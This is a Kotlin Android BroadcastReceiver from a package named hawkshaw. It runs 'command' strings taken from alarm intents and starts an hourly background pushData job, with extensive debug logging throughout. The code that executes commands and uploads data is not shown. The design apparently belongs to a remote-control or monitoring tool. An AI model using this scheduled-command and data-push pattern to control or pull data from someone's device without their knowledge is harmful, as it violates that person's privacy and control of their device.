package com.hawkshaw.library.handler

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancelChildren
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi

/**
 * BroadcastReceiver for handling alarms and scheduled commands
 */
class AlarmReceiver : BroadcastReceiver() {
    companion object {
        const val ACTION_SCHEDULE_COMMAND = "ACTION_SCHEDULE_COMMAND"
        private const val TAG = "AlarmReceiver"
        private const val ONE_HOUR_MS = 3600000L
    }

    private var job: Job? = null

    /**
     * Checks if at least one hour has passed since the last push data time
     */
    private fun checkLastPushDataTime(): Boolean {
        Log.d(TAG, "[DEBUG] checkLastPushDataTime called.")
        val lastPushTime = Prefs.getLastPushDataTime()
        val currentTime = System.currentTimeMillis()
        val diff = currentTime - lastPushTime
        val result = diff >= ONE_HOUR_MS
        Log.d(TAG, "[DEBUG] checkLastPushDataTime: CurrentTime=$currentTime, LastPushTime=$lastPushTime, Difference=$diff, OneHourMs=$ONE_HOUR_MS, Result=$result")
        return result
    }

    @RequiresApi(Build.VERSION_CODES.P)
    override fun onReceive(context: Context?, intent: Intent?) {
        val source = intent?.getStringExtra("source")
        val action = intent?.action
        val currentTimeForLog = System.currentTimeMillis() // Renamed to avoid confusion with checkLastPushDataTime's currentTime

        Log.d(TAG, "[DEBUG] onReceive called. Action: \"$action\", Source: \"$source\", CurrentTimeForLog: $currentTimeForLog")
        // Log all extras in the intent
        intent?.extras?.let { bundle ->
            if (bundle.isEmpty) {
                Log.d(TAG, "[DEBUG] onReceive: Intent has no extras.")
            } else {
                for (key in bundle.keySet()) {
                    Log.d(TAG, "[DEBUG] onReceive: Intent Extra - Key: \"$key\", Value: \"${bundle.get(key)}\"")
                }
            }
        } ?: Log.d(TAG, "[DEBUG] onReceive: Intent or extras are null.")
        
        Logger.d(TAG, "OnReceive: Source: $source, Action: $action, $currentTimeForLog", false, 4, null)

        if (intent?.action == ACTION_SCHEDULE_COMMAND) {
            Log.d(TAG, "[DEBUG] onReceive: Matched ACTION_SCHEDULE_COMMAND.")
            val command = intent.getStringExtra("command")
            Log.d(TAG, "[DEBUG] onReceive: Extracted command for ACTION_SCHEDULE_COMMAND: \"$command\"")
            if (command != null) {
                Log.d(TAG, "[DEBUG] onReceive: Handling scheduled command: \"$command\"")
                handleCommandString(command, CommandSource.ScheduledCommand) // Assuming handleCommandString has its own logs
                Log.d(TAG, "[DEBUG] onReceive: Finished handleCommandString for scheduled command. Returning.")
                return
            }
            Log.d(TAG, "[DEBUG] onReceive: Scheduled command string is null. Returning.")
            return
        }
        Log.d(TAG, "[DEBUG] onReceive: Action was not ACTION_SCHEDULE_COMMAND.")

        Log.d(TAG, "[DEBUG] onReceive: Calling JobScheduler.startScheduler().")
        JobScheduler.startScheduler() // Assuming JobScheduler.startScheduler() is synchronous or its effects are logged internally
        Log.d(TAG, "[DEBUG] onReceive: JobScheduler.startScheduler() returned.")
        
        if (checkLastPushDataTime()) {
            Log.d(TAG, "[DEBUG] onReceive: checkLastPushDataTime is true. Proceeding to push data.")
            job?.let {
                Log.d(TAG, "[DEBUG] onReceive: Active job found. Cancelling children.")
                it.cancelChildren()
                Log.d(TAG, "[DEBUG] onReceive: Active job children cancelled.")
            }
            Log.d(TAG, "[DEBUG] onReceive: Launching new coroutine for pushData.")
            job = CoroutineScope(Dispatchers.IO).safeLaunch {
                Log.d(TAG, "[DEBUG] Coroutine for pushData started on Dispatchers.IO.")
                // Using a trailing lambda instead of creating a new anonymous class
                pushData() // Actual pushData() method is not in context, assume it logs its actions
                Log.d(TAG, "[DEBUG] Coroutine for pushData completed.")
            }
            Log.d(TAG, "[DEBUG] onReceive: Coroutine for pushData launched. Job: $job")
        } else {
            Log.d(TAG, "[DEBUG] onReceive: checkLastPushDataTime is false. Aborting push data.")
            // Existing Logger.v call
            Logger.v(TAG, "OnReceive: diff is less then 1 hour, aborting push data", false, 4, null)
        }
        Log.d(TAG, "[DEBUG] onReceive finished.")
    }
}
